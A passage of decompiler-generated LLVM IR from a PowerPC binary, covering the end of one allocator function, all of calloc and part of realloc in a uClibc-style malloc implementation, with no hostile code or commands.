  uselistorder i32 %v0_1000b268, { 1, 0, 3, 2, 4 }
  uselistorder i32 %storemerge, { 2, 1, 3, 0 }
  uselistorder i32 %v1_1000b25c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1000b22c98, { 1, 2, 0 }
  uselistorder i32 %v3_1000b22c, { 1, 2, 0 }
  uselistorder i32 %v1_1000b1e4, { 1, 0 }
  uselistorder i32 %v0_1000b1e0, { 1, 0 }
  uselistorder i32 %v3_1000b1cc, { 0, 2, 3, 1 }
  uselistorder i32 %v3_1000b1b4, { 1, 0, 2 }
  uselistorder i32 %v1_1000b1b0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_1000b1a0, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000b19c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_1000b198, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1000b190, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_1000b17c, { 1, 0 }
  uselistorder i32 %v1_1000b174, { 2, 0, 1 }
  uselistorder i32 %v0_1000b15c, { 1, 0 }
  uselistorder i32 %v0_1000b138, { 1, 0 }
  uselistorder i32 %v0_1000b114, { 1, 0, 2 }
  uselistorder i32 %v3_1000b100, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_1000b150.pre, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000b0f0, { 5, 4, 7, 9, 8, 0, 10, 3, 2, 1, 6, 11 }
  uselistorder i32 %v3_1000b090, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v1_1000b08c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1000b058, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000b054, { 1, 0 }
  uselistorder i32 %v1_1000b030, { 1, 0 }
  uselistorder i32 %v3_1000b028, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_1000b0c0, { 4, 3, 2, 7, 6, 5, 0, 8, 1, 9 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 63, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 65, 66, 67, 68 }
  uselistorder i32* %r8.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 13, 14, 10, 11, 12, 15 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 4, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 16, 2, 17, 31, 18, 19, 1, 3, 20, 26, 21, 22, 4, 23, 6, 24, 27, 28, 25, 7, 29, 8, 30, 32, 9, 33, 10, 34, 35, 11, 12, 37, 36, 5, 13, 38, 39, 40, 14, 41, 15, 43, 42, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 5, 6, 9, 7, 8, 10, 11, 12, 4, 1, 13, 18, 19, 20, 0, 14, 15, 16, 17 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 14, 56, 57, 58, 59, 60, 65, 61, 62, 63, 64, 66, 67, 68, 69, 70, 0, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i1* %cr7_gt.global-to-local, { 4, 5, 6, 7, 8, 9, 2, 10, 11, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 12, 34, 35, 14, 36, 37, 38, 40, 39, 1, 0, 42, 15, 3, 43, 44, 45, 46, 47, 48, 49, 41, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i1* %cr0_eq.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 0, 11, 12 }
  uselistorder i32 -12, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 34, { 0, 2, 1, 3 }
  uselistorder i32 820, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b898, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_1000b894, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b878, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b840, { 1, 0 }
  uselistorder label %dec_label_pc_1000b828, { 1, 0 }
  uselistorder label %dec_label_pc_1000b80c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000b79c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b794, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b794.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1000b704, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b654, { 1, 0 }
  uselistorder label %dec_label_pc_1000b650, { 1, 0 }
  uselistorder label %dec_label_pc_1000b60c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b5b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b574, { 1, 0 }
  uselistorder label %dec_label_pc_1000b55c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b540, { 1, 0 }
  uselistorder label %dec_label_pc_1000b518, { 1, 0 }
  uselistorder label %dec_label_pc_1000b430, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000b414, { 1, 0 }
  uselistorder label %dec_label_pc_1000b388, { 1, 0 }
  uselistorder label %dec_label_pc_1000b390.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000b358, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b2f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b2ac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000b288, { 1, 0 }
  uselistorder label %dec_label_pc_1000b284, { 1, 0 }
  uselistorder label %dec_label_pc_1000b254, { 1, 0 }
  uselistorder label %dec_label_pc_1000b238, { 1, 0 }
  uselistorder label %dec_label_pc_1000b218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b1e0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b1cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b14c, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000b024, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1000b8bc = icmp eq i32 %arg1, 0
  %v0_1000b8c0 = load i32, i32* @lr, align 4
  store i32 %v0_1000b8c0, i32* %r0.global-to-local, align 4
  %v2_1000b8cc = mul i32 %arg2, %arg1
  store i32 %v2_1000b8cc, i32* @r31, align 4
  br i1 %v3_1000b8bc, label %dec_label_pc_1000b904, label %dec_label_pc_1000b8d8

dec_label_pc_1000b8d8:                            ; preds = %entry
  %v2_1000b8d8 = udiv i32 %v2_1000b8cc, %arg1
  store i32 %v2_1000b8d8, i32* %r0.global-to-local, align 4
  %v4_1000b8dc = icmp eq i32 %v2_1000b8d8, %arg2
  br i1 %v4_1000b8dc, label %dec_label_pc_1000b904, label %dec_label_pc_1000b8e4

dec_label_pc_1000b8e4:                            ; preds = %dec_label_pc_1000b8d8
  store i32 12, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v0_1000b8f4 = load i32, i32* @r2, align 4
  %v1_1000b8f8 = add i32 %v0_1000b8f4, -28672
  store i32 %v1_1000b8f8, i32* @r9, align 4
  %v2_1000b8fc = inttoptr i32 %v1_1000b8f8 to i32*
  store i32 12, i32* %v2_1000b8fc, align 4
  br label %dec_label_pc_1000b9ac

dec_label_pc_1000b904:                            ; preds = %dec_label_pc_1000b8d8, %entry
  %v5_1000b91c = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32 ptrtoint (i32* @global_var_10021074.479 to i32))
  %v1_1000b924 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_10021074.479 to i32))
  %v0_1000b928 = load i32, i32* @r31, align 4
  store i32 268482864, i32* @lr, align 4
  %v1_1000b92c = call i32 @malloc(i32 %v0_1000b928)
  store i32 %v1_1000b92c, i32* @r29, align 4
  %v3_1000b930 = icmp eq i32 %v1_1000b92c, 0
  br i1 %v3_1000b930, label %dec_label_pc_1000b9a0, label %dec_label_pc_1000b938

dec_label_pc_1000b938:                            ; preds = %dec_label_pc_1000b904
  %v1_1000b938 = add i32 %v1_1000b92c, -4
  %v2_1000b938 = inttoptr i32 %v1_1000b938 to i32*
  %v3_1000b938 = load i32, i32* %v2_1000b938, align 4
  %v1_1000b93c = and i32 %v3_1000b938, 2
  store i32 %v1_1000b93c, i32* %r0.global-to-local, align 4
  %v3_1000b93c = icmp eq i32 %v1_1000b93c, 0
  br i1 %v3_1000b93c, label %dec_label_pc_1000b944, label %dec_label_pc_1000b9a0

dec_label_pc_1000b944:                            ; preds = %dec_label_pc_1000b938
  %v1_1000b944 = call i32 @__asm_rlwinm(i32 %v3_1000b938, i32 0, i32 0, i32 29)
  %v1_1000b948 = add i32 %v1_1000b944, -4
  %v1_1000b94c = udiv i32 %v1_1000b948, 4
  store i32 %v1_1000b94c, i32* @r11, align 4
  %v1_1000b950 = icmp ult i32 %v1_1000b948, 36
  %tmp = and i32 %v1_1000b948, -4
  %tmp5 = icmp eq i32 %tmp, 36
  %v2_1000b954 = or i1 %v1_1000b950, %tmp5
  br i1 %v2_1000b954, label %dec_label_pc_1000b964, label %dec_label_pc_1000b958

dec_label_pc_1000b958:                            ; preds = %dec_label_pc_1000b944
  store i32 ptrtoint (i32* @global_var_1000b960.505 to i32), i32* @lr, align 4
  %v3_1000b95c = call i32 @__GI_memset(i32 0, i32 %v1_1000b948, i32 %v1_1000b948)
  br label %dec_label_pc_1000b9a0

dec_label_pc_1000b964:                            ; preds = %dec_label_pc_1000b944
  %v1_1000b964 = icmp ult i32 %v1_1000b948, 16
  %tmp6 = and i32 %v1_1000b948, -4
  %tmp7 = icmp eq i32 %tmp6, 16
  %v0_1000b968 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b968 = load i32, i32* @r29, align 4
  %v2_1000b968 = inttoptr i32 %v1_1000b968 to i32*
  store i32 %v0_1000b968, i32* %v2_1000b968, align 4
  %v0_1000b96c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b96c = load i32, i32* @r29, align 4
  %v2_1000b96c = add i32 %v1_1000b96c, 4
  %v3_1000b96c = inttoptr i32 %v2_1000b96c to i32*
  store i32 %v0_1000b96c, i32* %v3_1000b96c, align 4
  %v0_1000b970 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b970 = load i32, i32* @r29, align 4
  %v2_1000b970 = add i32 %v1_1000b970, 8
  %v3_1000b970 = inttoptr i32 %v2_1000b970 to i32*
  store i32 %v0_1000b970, i32* %v3_1000b970, align 4
  %v2_1000b974 = or i1 %v1_1000b964, %tmp7
  br i1 %v2_1000b974, label %dec_label_pc_1000b9a0, label %dec_label_pc_1000b978

dec_label_pc_1000b978:                            ; preds = %dec_label_pc_1000b964
  %v0_1000b978 = load i32, i32* @r11, align 4
  %v0_1000b97c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b97c = load i32, i32* @r29, align 4
  %v2_1000b97c = add i32 %v1_1000b97c, 12
  %v3_1000b97c = inttoptr i32 %v2_1000b97c to i32*
  store i32 %v0_1000b97c, i32* %v3_1000b97c, align 4
  %v0_1000b980 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b980 = load i32, i32* @r29, align 4
  %v2_1000b980 = add i32 %v1_1000b980, 16
  %v3_1000b980 = inttoptr i32 %v2_1000b980 to i32*
  store i32 %v0_1000b980, i32* %v3_1000b980, align 4
  %tmp4 = icmp ult i32 %v0_1000b978, 7
  br i1 %tmp4, label %dec_label_pc_1000b9a0, label %dec_label_pc_1000b988

dec_label_pc_1000b988:                            ; preds = %dec_label_pc_1000b978
  %v0_1000b988 = load i32, i32* @r11, align 4
  %v3_1000b988 = icmp eq i32 %v0_1000b988, 9
  %v0_1000b98c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b98c = load i32, i32* @r29, align 4
  %v2_1000b98c = add i32 %v1_1000b98c, 20
  %v3_1000b98c = inttoptr i32 %v2_1000b98c to i32*
  store i32 %v0_1000b98c, i32* %v3_1000b98c, align 4
  %v0_1000b990 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b990 = load i32, i32* @r29, align 4
  %v2_1000b990 = add i32 %v1_1000b990, 24
  %v3_1000b990 = inttoptr i32 %v2_1000b990 to i32*
  store i32 %v0_1000b990, i32* %v3_1000b990, align 4
  br i1 %v3_1000b988, label %dec_label_pc_1000b998, label %dec_label_pc_1000b9a0

dec_label_pc_1000b998:                            ; preds = %dec_label_pc_1000b988
  %v0_1000b998 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b998 = load i32, i32* @r29, align 4
  %v2_1000b998 = add i32 %v1_1000b998, 32
  %v3_1000b998 = inttoptr i32 %v2_1000b998 to i32*
  store i32 %v0_1000b998, i32* %v3_1000b998, align 4
  %v0_1000b99c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b99c = load i32, i32* @r29, align 4
  %v2_1000b99c = add i32 %v1_1000b99c, 28
  %v3_1000b99c = inttoptr i32 %v2_1000b99c to i32*
  store i32 %v0_1000b99c, i32* %v3_1000b99c, align 4
  br label %dec_label_pc_1000b9a0

dec_label_pc_1000b9a0:                            ; preds = %dec_label_pc_1000b988, %dec_label_pc_1000b938, %dec_label_pc_1000b978, %dec_label_pc_1000b964, %dec_label_pc_1000b904, %dec_label_pc_1000b958, %dec_label_pc_1000b998
  store i32 268482988, i32* @lr, align 4
  %v3_1000b9a8 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  br label %dec_label_pc_1000b9ac

dec_label_pc_1000b9ac:                            ; preds = %dec_label_pc_1000b8e4, %dec_label_pc_1000b9a0
  store i32 %v0_1000b8c0, i32* %r0.global-to-local, align 4
  %v0_1000b9b0 = load i32, i32* @r29, align 4
  ret i32 %v0_1000b9b0

; uselistorder directives
  uselistorder i32 %v1_1000b948, { 0, 3, 5, 4, 1, 6, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b9ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9a0, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v3_1000b9d0 = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @r31, align 4
  br i1 %v3_1000b9d0, label %dec_label_pc_1000b9e0, label %dec_label_pc_1000b9f0

dec_label_pc_1000b9e0:                            ; preds = %entry
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 268483048, i32* @lr, align 4
  %v1_1000b9e4 = call i32 @malloc(i32 %arg2)
  store i32 %v1_1000b9e4, i32* %r3.global-to-local, align 4
  store i32 %v1_1000b9e4, i32* @r29, align 4
  br label %dec_label_pc_1000bd44

dec_label_pc_1000b9f0:                            ; preds = %entry
  %v3_1000b9f0 = icmp eq i32 %arg2, 0
  store i1 %v3_1000b9f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000b9f0, label %dec_label_pc_1000b9f8, label %dec_label_pc_1000ba04

dec_label_pc_1000b9f8:                            ; preds = %dec_label_pc_1000b9f0
  store i32 268483068, i32* @lr, align 4
  %v0_1000b9f8 = call i32 @free()
  store i32 %v0_1000b9f8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1000bd44

dec_label_pc_1000ba04:                            ; preds = %dec_label_pc_1000b9f0
  store i32 ptrtoint (i32* @global_var_10021074.479 to i32), i32* %r29.global-to-local, align 4
  %v2_1000ba18 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000ba18, i32* %r3.global-to-local, align 4
  %v5_1000ba1c = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32 ptrtoint (i32* @global_var_10021074.479 to i32))
  store i32 ptrtoint (i32* @global_var_10021074.479 to i32), i32* %r3.global-to-local, align 4
  %v1_1000ba24 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_10021074.479 to i32))
  store i32 %v1_1000ba24, i32* %r3.global-to-local, align 4
  %v0_1000ba2c = load i32, i32* @r31, align 4
  %v4_1000ba2c = icmp eq i32 %v0_1000ba2c, -33
  store i1 %v4_1000ba2c, i1* %cr7_eq.global-to-local, align 1
  %tmp11 = icmp ult i32 %v0_1000ba2c, -32
  br i1 %tmp11, label %dec_label_pc_1000ba54, label %dec_label_pc_1000ba34

dec_label_pc_1000ba34:                            ; preds = %dec_label_pc_1000ba04
  store i32 0, i32* @r29, align 4
  %v0_1000ba44 = load i32, i32* @r2, align 4
  %v1_1000ba48 = add i32 %v0_1000ba44, -28672
  store i32 %v1_1000ba48, i32* @r9, align 4
  %v2_1000ba4c = inttoptr i32 %v1_1000ba48 to i32*
  store i32 12, i32* %v2_1000ba4c, align 4
  br label %dec_label_pc_1000bd44

dec_label_pc_1000ba54:                            ; preds = %dec_label_pc_1000ba04
  %v1_1000ba54 = add i32 %v0_1000ba2c, 11
  store i32 %v1_1000ba54, i32* %r3.global-to-local, align 4
  store i32 16, i32* @r24, align 4
  %v3_1000ba5c = icmp eq i32 %v1_1000ba54, 15
  store i1 %v3_1000ba5c, i1* %cr7_eq.global-to-local, align 1
  %tmp12 = icmp ult i32 %v1_1000ba54, 16
  br i1 %tmp12, label %dec_label_pc_1000ba68, label %dec_label_pc_1000ba64

dec_label_pc_1000ba64:                            ; preds = %dec_label_pc_1000ba54
  %v1_1000ba64 = call i32 @__asm_rlwinm(i32 %v1_1000ba54, i32 0, i32 0, i32 28)
  store i32 %v1_1000ba64, i32* @r24, align 4
  br label %dec_label_pc_1000ba68

dec_label_pc_1000ba68:                            ; preds = %dec_label_pc_1000ba54, %dec_label_pc_1000ba64
  %v0_1000ba68 = load i32, i32* @r30, align 4
  %v1_1000ba68 = add i32 %v0_1000ba68, -8
  store i32 %v1_1000ba68, i32* @r25, align 4
  %v1_1000ba6c = add i32 %v0_1000ba68, -4
  %v2_1000ba6c = inttoptr i32 %v1_1000ba6c to i32*
  %v3_1000ba6c = load i32, i32* %v2_1000ba6c, align 4
  store i32 %v3_1000ba6c, i32* %r10.global-to-local, align 4
  %v1_1000ba70 = and i32 %v3_1000ba6c, 2
  %v3_1000ba70 = icmp eq i32 %v1_1000ba70, 0
  %v1_1000ba74 = call i32 @__asm_rlwinm(i32 %v3_1000ba6c, i32 0, i32 0, i32 29)
  store i32 %v1_1000ba74, i32* @r28, align 4
  br i1 %v3_1000ba70, label %dec_label_pc_1000ba7c, label %dec_label_pc_1000bc60

dec_label_pc_1000ba7c:                            ; preds = %dec_label_pc_1000ba68
  %v1_1000ba7c = load i32, i32* @r24, align 4
  %v2_1000ba7c = icmp ult i32 %v1_1000ba74, %v1_1000ba7c
  %v4_1000ba7c = icmp eq i32 %v1_1000ba74, %v1_1000ba7c
  store i1 %v4_1000ba7c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_1000ba74, i32* %r9.global-to-local, align 4
  br i1 %v2_1000ba7c, label %dec_label_pc_1000ba88, label %dec_label_pc_1000bbf8

dec_label_pc_1000ba88:                            ; preds = %dec_label_pc_1000ba7c
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000ba8c = load i32, i32* @r25, align 4
  %v2_1000ba8c = add i32 %v0_1000ba8c, %v1_1000ba74
  store i32 %v2_1000ba8c, i32* @r31, align 4
  %v3_1000ba94 = load i32, i32* @global_var_10023a58.487, align 4
  store i32 %v3_1000ba94, i32* @r8, align 4
  %v4_1000ba98 = icmp eq i32 %v2_1000ba8c, %v3_1000ba94
  store i1 %v4_1000ba98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000ba98, label %dec_label_pc_1000baa0, label %dec_label_pc_1000bae0

dec_label_pc_1000baa0:                            ; preds = %dec_label_pc_1000ba88
  %v1_1000baa0 = add i32 %v2_1000ba8c, 4
  %v2_1000baa0 = inttoptr i32 %v1_1000baa0 to i32*
  %v3_1000baa0 = load i32, i32* %v2_1000baa0, align 4
  %v1_1000baa4 = add i32 %v1_1000ba7c, 16
  store i32 %v1_1000baa4, i32* %r9.global-to-local, align 4
  %v1_1000baa8 = call i32 @__asm_rlwinm(i32 %v3_1000baa0, i32 0, i32 0, i32 29)
  %v2_1000baac = add i32 %v1_1000baa8, %v1_1000ba74
  store i32 %v2_1000baac, i32* %r11.global-to-local, align 4
  %v1_1000bab0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000bab0 = icmp ult i32 %v2_1000baac, %v1_1000bab0
  %v4_1000bab0 = icmp eq i32 %v2_1000baac, %v1_1000bab0
  store i1 %v4_1000bab0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000bab0, label %dec_label_pc_1000baa0.dec_label_pc_1000bae0_crit_edge, label %dec_label_pc_1000bab8

dec_label_pc_1000baa0.dec_label_pc_1000bae0_crit_edge: ; preds = %dec_label_pc_1000baa0
  %v0_1000bae0.pre = load i32, i32* @r31, align 4
  %v1_1000bae0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000bae0

dec_label_pc_1000bab8:                            ; preds = %dec_label_pc_1000baa0
  %v0_1000bab8 = load i32, i32* @r24, align 4
  %v2_1000bab8 = sub i32 %v2_1000baac, %v0_1000bab8
  %v1_1000babc = urem i32 %v3_1000ba6c, 2
  %v0_1000bac0 = load i32, i32* @r25, align 4
  %v2_1000bac0 = add i32 %v0_1000bac0, %v0_1000bab8
  store i32 %v2_1000bac0, i32* @r11, align 4
  %v2_1000bac4 = or i32 %v0_1000bab8, %v1_1000babc
  %v1_1000bac8 = or i32 %v2_1000bab8, 1
  store i32 %v1_1000bac8, i32* %r9.global-to-local, align 4
  %v0_1000bacc = load i32, i32* @r30, align 4
  store i32 %v0_1000bacc, i32* @r29, align 4
  %v2_1000bad0 = add i32 %v0_1000bac0, 4
  %v3_1000bad0 = inttoptr i32 %v2_1000bad0 to i32*
  store i32 %v2_1000bac4, i32* %v3_1000bad0, align 4
  %v0_1000bad4 = load i32, i32* @r11, align 4
  store i32 %v0_1000bad4, i32* @global_var_10023a58.487, align 4
  %v0_1000bad8 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000bad8 = add i32 %v0_1000bad4, 4
  %v3_1000bad8 = inttoptr i32 %v2_1000bad8 to i32*
  store i32 %v0_1000bad8, i32* %v3_1000bad8, align 4
  br label %dec_label_pc_1000bd38

dec_label_pc_1000bae0:                            ; preds = %dec_label_pc_1000baa0.dec_label_pc_1000bae0_crit_edge, %dec_label_pc_1000ba88
  %v1_1000bae0 = phi i32 [ %v1_1000bae0.pre, %dec_label_pc_1000baa0.dec_label_pc_1000bae0_crit_edge ], [ %v3_1000ba94, %dec_label_pc_1000ba88 ]
  %v0_1000bae8 = phi i32 [ %v0_1000bae0.pre, %dec_label_pc_1000baa0.dec_label_pc_1000bae0_crit_edge ], [ %v2_1000ba8c, %dec_label_pc_1000ba88 ]
  %v4_1000bae0 = icmp eq i32 %v0_1000bae8, %v1_1000bae0
  store i1 %v4_1000bae0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000bae0, label %dec_label_pc_1000bb40, label %dec_label_pc_1000bae8

dec_label_pc_1000bae8:                            ; preds = %dec_label_pc_1000bae0
  %v1_1000bae8 = add i32 %v0_1000bae8, 4
  %v2_1000bae8 = inttoptr i32 %v1_1000bae8 to i32*
  %v3_1000bae8 = load i32, i32* %v2_1000bae8, align 4
  store i32 %v3_1000bae8, i32* %r11.global-to-local, align 4
  %v1_1000baec = call i32 @__asm_rlwinm(i32 %v3_1000bae8, i32 0, i32 0, i32 30)
  %v0_1000baf0 = load i32, i32* @r31, align 4
  %v2_1000baf0 = add i32 %v0_1000baf0, %v1_1000baec
  store i32 %v2_1000baf0, i32* %r9.global-to-local, align 4
  %v1_1000baf4 = add i32 %v2_1000baf0, 4
  %v2_1000baf4 = inttoptr i32 %v1_1000baf4 to i32*
  %v3_1000baf4 = load i32, i32* %v2_1000baf4, align 4
  %v1_1000baf8 = urem i32 %v3_1000baf4, 2
  store i32 %v1_1000baf8, i32* %r9.global-to-local, align 4
  %v3_1000baf8 = icmp eq i32 %v1_1000baf8, 0
  br i1 %v3_1000baf8, label %dec_label_pc_1000bb00, label %dec_label_pc_1000bb40

dec_label_pc_1000bb00:                            ; preds = %dec_label_pc_1000bae8
  %v1_1000bb00 = call i32 @__asm_rlwinm(i32 %v3_1000bae8, i32 0, i32 0, i32 29)
  %v2_1000bb04 = add i32 %v1_1000bb00, %v1_1000ba74
  store i32 %v2_1000bb04, i32* %r9.global-to-local, align 4
  %v1_1000bb08 = load i32, i32* @r24, align 4
  %v2_1000bb08 = icmp ult i32 %v2_1000bb04, %v1_1000bb08
  %v4_1000bb08 = icmp eq i32 %v2_1000bb04, %v1_1000bb08
  store i1 %v4_1000bb08, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000bb08, label %dec_label_pc_1000bb40, label %dec_label_pc_1000bb10

dec_label_pc_1000bb10:                            ; preds = %dec_label_pc_1000bb00
  %v0_1000bb10 = load i32, i32* @r31, align 4
  %v1_1000bb10 = add i32 %v0_1000bb10, 8
  %v2_1000bb10 = inttoptr i32 %v1_1000bb10 to i32*
  %v3_1000bb10 = load i32, i32* %v2_1000bb10, align 4
  store i32 %v3_1000bb10, i32* %r10.global-to-local, align 4
  %v1_1000bb14 = add i32 %v0_1000bb10, 12
  %v2_1000bb14 = inttoptr i32 %v1_1000bb14 to i32*
  %v3_1000bb14 = load i32, i32* %v2_1000bb14, align 4
  store i32 %v3_1000bb14, i32* %r11.global-to-local, align 4
  %v1_1000bb18 = add i32 %v3_1000bb10, 12
  %v2_1000bb18 = inttoptr i32 %v1_1000bb18 to i32*
  %v3_1000bb18 = load i32, i32* %v2_1000bb18, align 4
  %v4_1000bb1c = icmp eq i32 %v3_1000bb18, %v0_1000bb10
  store i1 %v4_1000bb1c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000bb1c, label %dec_label_pc_1000bb24, label %dec_label_pc_1000bb30

dec_label_pc_1000bb24:                            ; preds = %dec_label_pc_1000bb10
  %v1_1000bb24 = add i32 %v3_1000bb14, 8
  %v2_1000bb24 = inttoptr i32 %v1_1000bb24 to i32*
  %v3_1000bb24 = load i32, i32* %v2_1000bb24, align 4
  %v4_1000bb28 = icmp eq i32 %v3_1000bb24, %v0_1000bb10
  store i1 %v4_1000bb28, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000bb28, label %dec_label_pc_1000bb34, label %dec_label_pc_1000bb30

dec_label_pc_1000bb30:                            ; preds = %dec_label_pc_1000bb10, %dec_label_pc_1000bb24
  %v0_1000bb30 = call i32 @abort()
  store i32 %v0_1000bb30, i32* %r3.global-to-local, align 4
  %v0_1000bb34.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bb34.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000bb34

dec_label_pc_1000bb34:                            ; preds = %dec_label_pc_1000bb24, %dec_label_pc_1000bb30
  %v1_1000bb34 = phi i32 [ %v3_1000bb14, %dec_label_pc_1000bb24 ], [ %v1_1000bb34.pre, %dec_label_pc_1000bb30 ]
  %v0_1000bb34 = phi i32 [ %v3_1000bb10, %dec_label_pc_1000bb24 ], [ %v0_1000bb34.pre, %dec_label_pc_1000bb30 ]
  %v2_1000bb34 = add i32 %v1_1000bb34, 8
  %v3_1000bb34 = inttoptr i32 %v2_1000bb34 to i32*
  store i32 %v0_1000bb34, i32* %v3_1000bb34, align 4
  %v0_1000bb38 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bb38 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000bb38 = add i32 %v1_1000bb38, 12
  %v3_1000bb38 = inttoptr i32 %v2_1000bb38 to i32*
  store i32 %v0_1000bb38, i32* %v3_1000bb38, align 4
  %v1_1000bbf8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000bbf8

